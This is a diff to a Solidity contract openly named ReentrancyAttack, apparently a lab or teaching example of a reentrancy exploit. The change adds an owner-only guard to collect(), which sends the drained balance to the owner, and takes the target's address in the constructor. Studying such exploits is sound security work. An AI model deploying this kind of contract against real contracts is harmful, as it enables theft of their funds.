@@ -6,10 +6,15 @@ import "./Reentrancy.sol";
 
 contract ReentrancyAttack {
     Reentrancy public reentrancy;
-    address payable owner;
+    address payable public owner;
 
-    constructor(Reentrancy _reentrancy) public {
-        reentrancy = _reentrancy;
+    modifier onlyOwner {
+        require(msg.sender == owner, "Only the owner can collect");
+        _;
+    }
+
+    constructor(address payable _reentrancyAddres) public {
+        reentrancy = Reentrancy(_reentrancyAddres);
         owner = msg.sender;
     }
 
@@ -19,7 +24,7 @@ contract ReentrancyAttack {
         reentrancy.withdraw(msg.value);
     }
 
-    function collect() public {
+    function collect() public onlyOwner {
         owner.transfer(address(this).balance);
     }
 
